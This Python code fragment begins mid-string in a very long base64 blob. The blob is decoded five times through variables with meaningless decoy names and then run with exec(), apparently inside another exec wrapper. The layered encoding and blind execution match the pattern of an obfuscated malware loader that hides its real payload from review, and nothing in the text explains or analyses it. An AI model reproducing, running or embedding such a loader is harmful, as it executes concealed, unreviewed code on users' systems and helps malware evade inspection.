FubFdSbVIzVlRKS2MyRXpiRTVYUlRWeldXeFdXazFXVmxoTlZ6bG9WakJ3V0ZWdE1ERlpWa3BHWTBaa1dHRnJXbnBXTVZwUFpFZFdSbU5HVG14aVJtdzFWakowVjFReFJYbFdiR1JxVW0xNFZsbHRNVk5qUmxKWVkwWmtUMkpIZUZoWGExWXdZV3N4V1ZGc1ZsWldla0kwV1ZaVmQyUXlTa2hPVm1oWFlsVXhORlpIZUZkak1VNUlWbXRzV0dKWVFrOVVWVkpYWld4a1ZWUnVUbEpOYTFwNldXdGFjMVl5U25WUmJXaFhZV3RhU0ZsdGVHdFhSVFZaVTIxR1RtRXhjR0ZXYkZwdlZqRk9kRkpzYUd0U1dHaFZWbXhWTVZFeFpIRlJiazVVVm10YU1WbHJaRzlXTWxaelZtcE9WbVZyU2xCVmVrWlNaVWRPUjJGR1pHbFhSa3BNVmxkd1MySXlUWGhpU0Vwb1VsVndjVlJWWkRSVFZsRjRZVWhPVkdKRk5VZFpNR00xVjIxS1dHVkZVbHBOUjFKTVdrWmFWMlJXWkhKalJrNU9VbTA1TkZZeWVHRlVNVVY1Vkd0b1ZWZElRbFpaVjNSaFlVWlpkMVpZWkd0aVJUVlhWbTAxYTJFeVNsWlhiR3hWWVRKU2NsbFdWWGRsUm1SeFZteFNWMVpzY0ZWWFZFSnJWRzFXVjFWdVZsaGlXRUp3Vm0xMFlXUldaRmxqUlhSWFRXeGFXVlpYTlZOV01rcDBaVVYwVm1GcldqTlVWM2h5WlZkS1JsUnRlR2xXYTNCaFZsWmpNV0V5UmxaTlNHUnBUVEpTVmxSWE1UUlNSbXh4VTJ4T1ZGWnNXakZYYTJSM1lrZEtWV0V6YkZkU1ZrcE1WbFJLVDFOR1VsbGlSbFpwWWtoQ2VGZFhlR0ZTTURGWFdraEdWR0pZUW5KWmExWnpUVEZhV0U1WE9WZE5hMW93V2xWb1lWZHNXbGRYYkVKVllsaG9URlJzV2s5WFZrWnlWVzFvVjFaV2NERldWRVpYVkRGRmVWVlliRlZpYkVwd1ZUQmFZV05zVmxWVGJYUnFVbXMxVjFaSGRFdFpWVEZJWlVWV1ZsWnRVbkpWTW5oR1pERktkRTVXVWxkV1ZGWkVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlV4VVRGa2NWRnVUbE5TYTFwWlYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNa3BKVVcxb1RsTkdTa1pXTW5CUFVUQXdlR0V6YkU1WFJUVnlWbXBHUzFOV2JISmhSbVJhVmpCd1ZsbFZhR0ZXUlRGV1YycE9XbFo2UmxSVk1XUkxVMVp3U0ZKc2FGTldSVlkwVmpKMFUxTXlUWGxWYkdScVVsZG9jMVV3VlRGVWJHeHpZVVpPYWsxWGREVlVWVkpIWVZaSmQyTkZXbGRTYldoNlZrWmtTMUpyTlZsVWJVWlRWbXh3VVZkclkzaFRNbEpYVlc1V1dHSlhlRlJVVmxwM1ZqRmtWMWR0T1ZaTmF6RTBXVEJhYTFkck1YRmlSMmhhVm0xU1ZGVXhXbFprTVZwVlZteGtVMkpJUWtoV2FrcDZaVVphUjFkdVNsTmliRnBWVkZaV1lVMHhhM2RhUlhSclZtdGFlRlZ0TVRCVmF6RjBWVzVrVjJKR1duWlZla3BMVTBaU1dXTkdWbGROYkVwdlZtMDFkMVp0VVhoYVNFNW9VbGhDYUZSWGVFdFRWbEYzV2tkMGFHSkZOVWRaTUdoUFYwZEZlVlZ1Y0ZwV2VrWlVWV3RWTVZOSFNrWmxSbHBYWlcxNE5GWlVSbGRaVmtWNFZsaG9WR0pHY0ZkWlZFNURWVEZTVjFkclpHbGlSbG93V2xWYWExWlZNVlpXYWxKWFZqTlNNMVpzVlhoU1ZsWnlaVVpvYUUxc1NsbFhWM2hYWXpGT1YxSnVWbWxTTUZwWVZGWldkMDB4V1hoVmF6bFdZbFZzTTFwRldsZGhWVEZKVld0MFZsWkZTa2haYlhoUFZteHdSazlYY0U1WFJVcGFWbGN3TVdNeFVrZFNXR3hyVWxob1ZWWnNWVEZSTVdSeFVXNU9WRlpyV2pGWmEyUnZWakpXYzFacVRsaGhNVnB5V1hwQmVGTkdUbkpoUm1SWFpXMTRUbFpzV21wT1YwcHpWR3hhVldFd2NHaFVWM014VTJ4VmVVNVZUbWhXTUhCNlZUSTFhMWR0U2xWU2JXaGhVak5SZDFWclpFWmtNbEpHWTBaS1RsSldjREZXVkVaWFlURlJkMDFWYUZkaVIzaFRXV3hvYjJOV2NGZFZiRnBzWWtkNFdGZFljRWRoUlRGeVkwVnNZVkpGTlZoWlZWVjRZekZrY1Zac2NHbFdSVnBaVjFod1FtVkZOWE5VYkd4WFlrWndUMWxyV25OTk1WcFhWV3R3VDFZeFNsbFdSbWh6VlVaa1JrNVhhRmRpV0doTVdrUkdkMUpzY0VWVmJXeFRZa2M0ZUZZeWNFdGpNVlYzVFZWb2FGSnJXbGhXYTFaaFZrWldjVkpzVGxOaVZYQklWVzEwZDFaR1RraFZibFpYWVRGYWNWUnNaRWRTTWs1R1lVZHNWRkpzY0c5WGJGcFhVekZXYzJFemJFNVdiVkp2VkZkMFlWZFdXa2hqUlU1b1VteHZNbGxyVWtkV1JsbDVaVWhzVm1WclNucFZhMXBIVjBad1JtTkdVbE5XVnpoNFZqRmFZV0ZyTVZaTlZWcHJVbFpLVlZsc1ZuZFViRnAwWTBWT2FXSkdjRWRYV0hCWFlVWktkVkZyYkZwaE1taFlWMVprVjFac1RuTlRiSEJPWVd0YVdWZFdVa3RTTVdSSFZXNUdVbUpYYUZoYVZ6RXpaVVphUmxwSVNrNVNNVXBYV1d0b1EyRXdNWFJWYldoWFltNUNXRmt5ZUU5V2JGWlpXa2RHVGxJemFEWlhiRlpyVkRKR2RGSnNXbWxUUjFKVFZGY3hORkV4WkhGUmJrNVRVbXRhTUZwRlpIZGhWbGw2V2tSV1YwMXVhSFpWTWpGVFYwWlNkVlZzWkdsV1JWcDRWMWQ0WVZsVk5YTmlSbHBWWWxSV2NWVnNWVEZrTVZaWFdrZDBWR0pGVmpOVk1qVlhWMFphZEZScVVscGhNbEpRVkd4YVIxWlhTa1pqUms1T1ZsYzRlRll4V21GaU1XeFlVMnRvVldKclNsQldhazV2WXpGV2NWSnRSbXBXYmtKSVdWVmFUMkZXU25SYVJGcFhVbnBHTTFsWE1VdFhSMVpGVkcxR1UxWlVWakZYVmxwWFl6Sk9SMVJ1Vm1sU01GcFpWVzEwYzA1R1pGVlRXR1JPVW0wNU5Ga3dhRk5XTWtaeVUyMUdWVlo2Um5KYVIzaFBZMVpPZEU5Vk5WTk5WWEJMVmxaak1XUXhWa2hTYkZab1VrVndZVlJYY0VkWFJuQllUVlpPVTFKVVJsbFphMlJIWVVaYVIxZHVaRmhXTTFKeFZHeFZNVkp0VmtsVmJYaFRUVzFvZDFkWGVHRlNNREZ6V2toR1ZHRXlVbkpWYlRWRFYyeGFSMkZIUmxoaGVrSXpXVEJqTlZkdFZuSmpTRlphWWxoUmQxWnJWVEZXVmtaMFlVWk9UbFp0T1RSV1dIQkRZakZOZVZOcmFGVmhiRnBUVm10a05GVnNiRmRXYTNSUFZtMVNlbGxWVlRGaE1WbDNWMnBHVjFKNlZtaFpWbVJIVjBad1NWcEdVazVXYTI4eVYxWmFWMk15VGtkVWJHeFNZVEZLYjFac1ZtRmtWbFY0Vm1zNVVrMXNSalZXUnpWVFlWWktSbU5IUmxkTlJuQk1XWHBHVm1ReGNFWmFSM2hwVmxad1JsWldXbE5qTVU1elUxaHNWbUpVYkdGWmEyUlRWMFp3V0dWSGRFOVdhelV3V1RCa01GZEdTbGxSVkVaWFRXNW9jVlJXVlhoU2JVcEpWR3MxVjAxSVFreFhWekV3VXpBMVYySkdaR2hTTUZwdlZXcEdTMU5XV25Sa1NFNVlZa2RTUjFSc2FHRldSbGw2V2tST1ZtVnJTbnBWYTFwSFYwWndSbU5HVWxOV1YzY3dWbXBHYW1WRk5VaFVhMlJvVFRKb1ZsbHNhRzloUmxweFVtdGthV0pHV2toV1IzUlBZVmRLU0dWR2JGVldiVkV3V1ZkemVGZFdVblZSYkdoWFVsUldXVmRzV210VU1sSkhWMjVXVjJKWVVsTlVWV2hEWTJ4YWNWUnVUbFJOYkVZMVZsZDRiMVpIU25KT1Z6bFhZV3RGZUZac1dtdGpNWEJIV2tkb1RsSXphRFpXUmxaWFRVWk9jMUpZWkZOaVZGWlZWbXhrYjFKR2NGZFhibVJZVm0xU01WVlhNWE5VYXpGWFlucEtWMVl6UWt4VmFrcFRVakpPUjFWc1NsZFNNMmhNVmxkd1MxVXlTWGhpU0U1aFVtMVNjMWxyWkZKTlZsVjVUVVJXYUZKdFVrZFVhMmhyVjIxR2NrNVZlRlZpUmxwNldYcEJlRmRHVG5KT1ZrNW9ZVEZ3ZDFaVVJtcGxSbEY1Vm14a2FWSnRlRlpaYkZKelZqRldkV05JVG10TlYzZ3dWR3hhUzJGR1duUmhSazVhWVd0d2NsVXllRVprTVVwMFRsWm9hR0V6UWtsWGExWmhaREZhZEZOcmFHdFNXRUpVVld0V1MyUldXWGxqUlhSVFRXeEtTRmt3V25OV1YwcFdZMFYwV21KR1ZYZGFWVnB5WlZVMVZtUkhiRk5OU0VGNFZteGFhMk14WkZkWGJsWlZZbXRLV1ZWclZuZGxiR3hWVVc1T2FrMUVSa2RhUlZaM1ZXc3hSbGR1VmxaTlZscHlWV3BCZUdNeVRrZGlSbEpwVmpKb2IxWkdaRFJXTWtwelZtdGtWV0V3Y0hCVVZtTTFUbFpXZEU1V1RscFdiVkpIVkd4a2MxWkdXalpTYmxwYVRVZFNUMXBYZUZka1ZtUjBZMGRzYVZkR1NqTldha0poV1ZkV2RGVllhR2hTYlZKeFZGY3hORmxXVWxWUmJtUnBUVmQzTWxVeU1EVldiRmwzWWtSV1dtRXlhRmhaVkVaR1pESk9TR1JHVWxkV1ZGVXlWakp3UjJSdFZsZFRibFpXWWxWYVdWVnNVbGRqUmxWNFdUTm9hVTFyTlVsV1JtaDNWbTFLYzJOSVJscGlWRVYzV1RCYWExSXhaSFZqUjNoVFlsZG9XVmRZY0V0ak1XUnlUVWhrYWxKNmJHRmFWM1IzWkd4YVYxcEZjR3hXTUhCS1ZtMHhNRlZyTVVsUmJrcFdUVlphVUZwWGVIWmxSMGw2WWtaT2FXSkZjRzlXYWtKV1RWZEdWMVJzYUU1V2VteHhWV3BCZUU1c1dsaE9WMFpvWWxWd01GcEZhRU5YUmtwelkwUmFZVlpzY0haV2FrcE9aVmRLUjJORk5VNVRSVW95VmpGb2QxTXlTWGhXYkdoVVYwZDRjRlV3V21GamJGWlZVVzVrYUUxVk5WZFdSelYzV1ZVeFdFOVVWbFppVkZaVVYxWmFhMUpyTlZoaVJsSlhaV3RhTWxkVVFtdFViVlp6Vm01V1dHSllRbkJaYkdoVFpERlpkMWR0Um14aVZscDZXVlZhYTJGck1YUmxSMFpWVmtWS00xbHFSbk5PYkU1MFQxWmFWMDFIZHpGWFYzUnZWakpGZUZKWVpHcFNNMUpWVm14Vk1VNXNaSEZTYmxwc1ZtdHdNVlpYTVVkWFJrcFZWbTVDVmsxWFRqUlpha3BQVTBaU1dXTkdXbWxpU0VKNFYxY3dlRTFIVGtkYVJXUllZbTVDVDFWdE1XOVhSbXcyVTI1T1dHRjZRak5aTUdNMVYyMVdjbU5JV2xkV2JWSkxXbFprUzFOV1duUmtSa3BPVTBWS2VWWlVSbGRVTWxaellqTm9hVTB5ZUZSWmJYaExZVVpaZDFaVVJtaFdhelZaVkZaak5XRnNTWGROVkZwWFZucFdhRmxYTVV0a1IxSkpVV3hvVTJKSVFUSldSbHBoWWpGWmVWUlliR2xTYmtKUFZGVm9RMlJzWkZsalJYUnBUVlphV1ZVeGFITmhWazVIVjI1S1ZsWkZTak5aVkVaUFZteFNkV05IUms1V2Vtc3hWbGN3TVZVeGJGZGFSVnBQVmpKNFZWWnVjRWRrYkd0M1drVTFiR0pHV2pGV01qRjNZVmRLV1ZWdVpGZE5SbkJvV2xkemVHTXlSa2RhUjNCT1lsaG9hRlpHVWtOa01rbDRZa1JhVkdKVWJGZFdha0p6VGxac2NtRkdaR2hOVlZZeldUQmtNRlpHV2xaT1ZGcFlZV3RhTWxwV1drdGtWbFowVW14b1UxWkdXbmRXVkVacVpVZEplVlJyYUZWWFNFSlhXVzE0ZDJOV2JIUk5WRUpxVW0xU1NGWXlOWGRVYXpGWVlVWm9XbVZyY0hwV01uTjNaREpPU0U5V2NHeGhNMEl5Vm14YWExTnRWbGhUYTJ4WFlsaFNVMVJWYUVOamJGVjRWbXM1YkdKSE9UUlphazV6VlRKS2MxTnRhRmROUmxWNFdWWmFUMWRGTVZoUFYzQlRUVVJGTWxac1l6RlpWMFowVTI1U2ExTkZTbGxWYlhoM1RteFNjbGR0T1ZkTmF6RTFXV3RhZDFSck1VbFJibHBZVjBoQ1RGbHFSbGRYUms1WllrZHNWRkpzY0hsV1ZsSkRaREpGZUZSc1dsVmlia0pvVkZaak5VNVdWblJPVms1YVZtMVNSMVJzWkhOV1JsbzJVbTVhV2sxSFVrOWFWM2hYWkZaa2RHTkhiR2xYUmtvelZtcENZVmxYVm5KT1ZtUm9VbTFTY1ZSWE1UUlpWbEpWVVc1a2FVMVhkekpWTWpBMVZteFpkMkpFVmxwaE1taFlXVlJHUm1ReVRraGtSbEpPVmxSV1JGZHJaREJqTVVwWFUyeHNZVkpXU205V2JGWmhaRlpWZUZack9WSk5iRnBZV1d0YWIxUXhXWHBWYmtKVlZqTkNTRmt4V25OV2JHdzJWbTEwYVZaVVJURldiWGhyWVRGV1YxWllaRlJoYkZwWlZtMHhUbVZHYkZWVGEzQnNWbFJHU2xadE1YZGhWbHBYWWpOb1YwMXVVbkpaZWtwVFYwWldjbFZ0Ums1TmJFcFBWbGQwWVZZd01IaFVXR2hUWW14d2FGUlZaRFJTVmxaWFdrZDBhRkpzYkRSWmEyTXhWMnN4Y1ZKcmFHRlNiSEF6VlRCVk5WZFdWbk5qUlRWcFZqSmtOVll4WkhkVU1WRjVVMnRhYVZKV1dsQlZhMlEwVXpGV2NsZHJXazVTYkVZMVYydG9ZVmxWTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWXlhRVZYYkZwaFpERmtSMVp1VmxKaVNFSlBWRlpXZDAweFpGaGpSWEJPVW0wNU5GVlhlRk5WYlVwMFpVaENWVlpGV21oVVZscHJZMnhTZEU5WGVGZGlXR2hhVmtkNGEwMUhSbFpOV0VaU1lXdGFhRlZ0TVU1bFJtdDNWMjVrYTFKVWJGcFphMlJ6Vm1zeGRGVlVRbGRTYkhCUFZGVmtWMVpyTlZkVmJYUk9ZbFpLVVZkc1pEUldNREZYVld4YVZtRXdjSEZWYkdoVFZURnNjVk50ZEZSaVJWWXpWVzB3TVZkSFNraFZWRUphVFVad00xa3dXa2RrVjBwSFkwWmtiR0pHY0RWV01XUjNVMjFXU0ZKdVVsTmhNbWhSVmpCYWQyTldVbGhsUm1ScFlrWmFTVmxxVG10WlZURkZWbXRhVmxac1NtaFZhMlJIVm14S2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVak5DVlZWc2FFTmxiRmw1WkVkMGFrMXJXakJXVjNSdllWWk9SMk5JUWxwV2JGcEhWR3hhVDFadFJrWmtSM1JwVm10d1dsWkhlR3ROUmxKSFZHdGFhbEo2YkdGWmJGSkhWa1p3U0UxVmRGZFNWRlpXVlcweGMyRldXWHBoUkVKWVZqTkNVRlY2U2xOU2JWSkdWbXhhV0ZKc2NGQlhiR1EwVmpKV2MxUnNXbFpoTVhCelZXeG9iMlZHVlhoaFNHUlZVbXhXTmxkcll6RldWbGw1WlVoc1ZtVnJTbnBWYTFwSFYwWndSbU5HVGs1V2JrRXlWakZhWVdFeFpITmlNMnhWWW14S1ZGbHRlR0ZoUmxaMVkwaE9UbEp0VWxaVk1qQTFZVEpLVm1KRVdsZFNla1V3VlRKNFMxSldWbFZXYkZaWFRUQktXRlpITVRCVU1rNUhVbXhvWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnprMVZrZDBjMVpIU2xsaFIyaFdZV3R2TUZreFduZFNiSEJKVkcxMGFWWllRak5XVmxwVFl6Rk9jMVJyV21wU1JYQm9WVzB4VG1WR2JGVlJha0pVVm1zMU1GbFZaSE5oVmxweVlqTnNXRll6YUU5VVZsVjRWMFpPZFZWdGJGTmxhMXAzVmtaU1EyUXdNVWRVV0dSV1lUTkNjbFpzVWtkbFJscHpZVVU1VkdKRmNFaFZiWEJIVmxkS1dHVkliRnBsYTBwNlZXeGFUMWRXUm5KVmJXaFhWbFp3TVZaVVJsZFVNVVY1VTJ0b1ZHRXllRlpaYkdodlZWWmtjVk5VVm1saVJUVlhWa2QwUzFsVk1VaGxSVlpXVm0xU2NsVXllRTlTYkU1eFZteG9hVkl4U2xWWFZFSmhZMjFXYzFadVZsSmlWM2hQV1ZkNFMyUldXbFpYYXpsU1RXeGFXVlV4YUhkV01rcHpWMjFvVmxaRmNIWlViRnByVmpGc05sSnRhRTVoTW5jeFZrWldiMVl5UlhoWGFscFhZbTFTV1Zsc1VrSk5WbkJYV2tWMFYxSnRPVFpaVlZWNFlVZEZkMWRZY0ZkU1ZscFFWVmN4VjFadFZrbFNiRkpYVWxad1RsWnNVazloTWtwelZXeG9hVk5GY0ZWVVZXUTBVbFpXVjFwSGRGUmlSV3cxV2xWb1UxWkdXbGhWYm5CaFZqTm9kVnBXVlRGWFZtUjBaRVpPYUdKWWFETldNV1F3WVRGSmVWVnNhRk5oYkZwdlZUQmtVMk5zV25GUmJtUnNZa2Q0V0ZkclZUVldNVXAxVVd4c1YySlVSWGRXUlZwV1pERktWVlpzV2xOaGVsWkZWbTE0YTFReVVsZFhibEpzVW10S2FGUlhjSE5rVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWk5SbHBNVkd4YWMxWXhiRFpTYXpWVFYwWktSbFpVU2pCaU1XUnpWMnBhVTJKck5WVldiRnBoWld4V2MxWlVWbXBTYTFwWlYydFdkMVZyTVVobFNGWldaV3MxZWxWVVNrdGpNa3BIWVVVMVYwMHlhRlpXYlhCSFVqSlJlRkpZYkdsU1ZYQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVnRNREZYYXpGSVlVVjRXazFIVWt4YVJscFhWMFU1Vm1OSGJGTmhNMEkyVmpGamVHTXhSWGxUYms1cFVtMW9UMVpxVG05VE1WWnhVV3h3YkZadFVucFpWVll3WVVaS2RFOVVWbGRpUmtwb1ZUSjRSbVF5U2toT1ZsSk9UVzVvUlZkc1kzaFZNVTVYVkd4b1VGWXpRbkJXYTJRd1RrWmtXRTFJYUZaaVZXdzBXV3RhYzFkSFNsbGhTRVphWWtaYWFGcEdXbXRqTVZKeFZHMUdUbEpGV2pOWFZsSlBVVEZTUjFac2FGQldlbFpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kV1JrcFdZbnBHV0Zac2NIRlVWbFY0VW0xU1JsVnNVbGROYkVwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1F4VmpaU2EyUnJZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteHdTVlJ0YkZkV00yaExWbFpqTVdNeGJGZFhXR2hVWW0xU1dWWnJWVEZXUm10M1drVndiRlpVVmtsWGExcEhZVWRHY2xOdVZsZFNiVko1VkZWa1VtUXdNVlpXYld4T1UwWktURlpXVWtOU01rcHpWR3hhVldFd2NHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVmRyTVVoaFJYaGFUVWRTVEZwR1dsZFhSVGxXWTBkc1UxWlhPSGhXYWtvMFlURlZlVlJyWkdoTk0wSlhXVzEwUzJOR1VsaGpSa3BPWWtVMVYxWkhkSGRaVlRGSlZWUkdWbFl6VW5KWlZsVjNaREpPU1ZSc1ZsTk5NbWcyVmxjeE5GVXhTblJXYTJSU1lrZFNjMVpzVm1GT1ZsVjRWbTA1VlUxRVJrbFdSelZEWVVaT1NGVnVSbHBpUm5Cb1dUSjRjMVl4Y0VaUFZUVlRUVVp3V2xaRVJtOVdNVkpIVmxoc2ExSllhRlZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWmpTSEJZVmpOU2NsbDZTa3RXYlVwR1lrWkthV0pZYUc5V2JYQkhVekpSZUZwR1ZsVmlSVFZ4VldwQ2MwNVdVbkphUjNSV1ZqQmFlRlZYTURGV1ZscHlUVWhrWVZac1ZqUlZiR1JLWlZad1JsVnRhRmRXVm5BeFZsUkdWMVF4Um5OaU0yUnBVbFpLVTFacVNsTlRNVlpWVVd0a2FXSkZOVmRaVlZaUFlrWlpkMWRzYkZWaVJrcEVWa1ZhUm1ReVRrZFRiSEJPWVd0YVdWZFdVa3RTTVdSSFZXNUdVbUpYYUZoYVZ6RXpaVVphUlZOdVRsSmlWVnBYV1d0V1UyRnJNWFJWYmtaVlZrVmFURlJzV2s1a01rWkdWRzE0VjJKclNscFdiR014VVRGa2NrMUlhRlJpYlZKaFdWZDBjbVF4YTNkV2FrSldZbFZzTlZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbUZHWkdsaGVsWjRWa1prTkZack1YTlNXR3hwVWxWd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2VlRGYVIyUlhTa2hoUm1Sc1lrWlplbFpZY0VOVU1VMTRWbXhvVldKc1NsaFpiR2hUWWpGYWNWRlVRbXROVjNoWVYxaHdWMkV4V2xWaVNHUldWbTFTZWxVeWVFWmxiRkowVGxaYWFWWkZSWGhYYkZwaFpERmFSazVXWkZWaVJUVllWbTEwWVdSV1ZqWlViazVTVFd4YU1GWlhkSE5XUmxvMllraEdWazFHV2pOWmVrWnJZMnh3U1ZSdGFHbFdhM0JLVjFkMGIxbFhSbGhTYkdoclUwZFNVMVJYTVRSUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJsZHVWbGhXUlVwMlZYcEtUMU5HVG5WV2JGcFhaVzE0VEZkV1dsZFNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTJScFlrVTFWMVpIZEV0WlZURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVZHSlZOVWRXUnpWRFZXeFplVlZyZEZaV1JVcElXVzE0VDFac1VuSlRiVVpPVmpOUk1sWnNaSGRXTWtaelUxaG9XR0ZzY0ZaVmJuQlhZMnhyZDFwRmRHdFNiRm94VmtjeGMxVnRWbk5YYWxaWFRXNW9kbFY2U2xOV01rNUhZVWQwVGswd1NsQlhWbHBUVmpGYVYxcElUbWhTYXpWVVZXcENjMDVXVW5OaFNHUm9WbFJHTVZsVmFFOVdNa1Y1Vlc1d1ZWWlhVa3hWTUZwaFl6SkdSbVZHU2s1VFJVcExWbXhTUTFack5WZFhhMlJZWVRGd1dWbFljRWRXVmxwMFpFVmthV0pJUW5sV1IzUlBWa1pLZEdWR2JGVldiVkV3VlRKNFMxZEhWa1pYYkZaT1lsaG9SRmRXV2xkak1VcElWRmhzWVZJd1drOVpWRVoyWkRGWmVXVkdaR3BOYTFZeldrVmFTMkZWTVhSVmEzUldWa1ZLU0ZsdGVFOVdiRkp5VTIxR1RsSXphRXBYVjNSdlZqSkdjMVJyWkZoWFIxSlZWRlZhWVdGR2NFaE5WVGxyVW14d1dsWnRlR3RVYkVsNVlVVjRWMkpZVWxoV2JYaDJaREpTUlZac1NsZE5ibWhZVmxSQ1YyUXlUWGhpUkZwVllYcFdhRlJXYUVOWFZsSnpWV3RPV2xadFVrZFphMk14V1ZaS1dGUlVRbGhoYTNCUVZURmFUMlJIVmtoU2JFNU9ZbTFvTkZZeWRGZFVNVVY1VW10a2FVMHllRlJaYlhSTFkwWnNWMVp1VG10TlZWWTFXV3RXUzFsVk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWndUbEl5YUUxWFYzUmhaREZPU0ZOcmFHcFNNMUpUVkZjeFUwMHhWbFZUYms1U1lrYzVNMWxyVmxOVmJVcFpZVWhDVmsxR1ZYaFpla1pTWlZad1NWZHRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1pGTlZSbEpXV2taa1dGWnJXakJhVldSM1lrWmFSMVpxV2xoV2JIQnhWRlprUm1WV1RuSmhSM1JPVFZad2RsWkdaRFJaVlRWWFlraFNUbFp0VW5GVVZWSkdUV3hWZUdGR1pGZGhla1o2VmpGb2ExWnNXa1poZWtaaFVtMVNUMXBXVlRWWFZsSjBVbXhrYVZKWVFYcFdNblJYWVRBMVNGTnJaRmhoYkZwb1ZGY3hORlpHVWxaYVJ6bFdWbXh3VmxWdGVFOVZNREZYVTJ0a1dtRXhjRWhWTW5oUFUxWndTRTVXV21oaE0wSkpWMnRXWVdReFdrZFNia3BxVW1zMVZGVnVjSE5rVmxWNFdraE9VbUpWTlhsWmExWnZXVlpKZVdGSVFsZGhhMXBvVlhwR2EyTnNVblZUYkZKT1VqTm9SbFpXV210aE1VNXpVbGhrVTJKVVZsVldiRlV4VWtad1JWTnJPV3RTTUhCS1ZtMHhNRlZyTVhSVmJtUlhZa1phY2xSclpFdFNNa3BIWWtaV2FWZEhhRXhXVkVKclZUSkplR0pHWkdoU2EzQm9WRmQ0UzFkV1VuTlZhMDVvVW14c05sZHJZekZaVmtwWVZXNWFXbUV4V25wVk1GcFRaRlprZEdSR1pHeGlSbGw2Vm1wS01HRnJOVlpOU0d4VVltdEtVMWx0ZEV0alZuQlhWbXQwVG1KSVFrbFVWbHByWWtaYVdHVkZjRmRXZWxab1ZUSjRUMUpzVG5GV2JHaHBVakZLVlZkVVFtRmpiVlp6Vm14c1YyRXpRbTlXYWs1VFZGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1RGcEVSbk5rUlRWV1ZHczFWMDFWY0VaV01uQkxZekZhYzFScldtcFRSVFZoV2xkek1WUXhaSEZTYm1SWVVsUldWbFZYTVVkWFJrcFlaVWhXV0dFeFduRlVhMXAyWlZaU2NtSkdVbWxYUjJodlZsZHdTMDVIVGxkalJWcFZZVEExYjFWdE1EVk9WbFowVGxWT2FGWXdXbGRaYTJoclZXc3hkR1ZGVGxoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWXhVa05pTVUxNVUydGthbEpYYUhCVmFrNURZMnhXVlZOdGRHdE5WVlkxVjJ0b2EyRXdNWEpPVkVKWFlsUkZkMWxWV2xwa01EVkpXa1pTVGxKVVZqVldWVnBQVTJ4TmVHSkdhRTlYUmxwdlZqQmFkMk14YTNsT1ZUbG9VakExTVZsVVNtdFZWbFYzVTI1Q1dGWnRhRkJaYTFVeFkxWldXVlpzY0doaVIzUXpWakowYTFZeVJuUlRXR3hXWWxob1RWVnFRVEZrYkdSWFlVVjBhRkp0ZERaV1Z6RTBZVzFLV0dWRVdtRlNWMUo2V1ZkME1GVnRUa2hsUjNoVFRWWndlRlY2UW10U01sSllVMjVTYVZKRmNHaFdNRlozVG14a1YyRkZkRTlXV0ZKVFZVWlJkMUJSUFQwPQ=="
minimum = base64.b64decode(legislation)
astonishing = base64.b64decode(minimum)
mechanism = base64.b64decode(astonishing)
negotiation = base64.b64decode(mechanism)
imposter = base64.b64decode(negotiation)
exec(imposter)"))
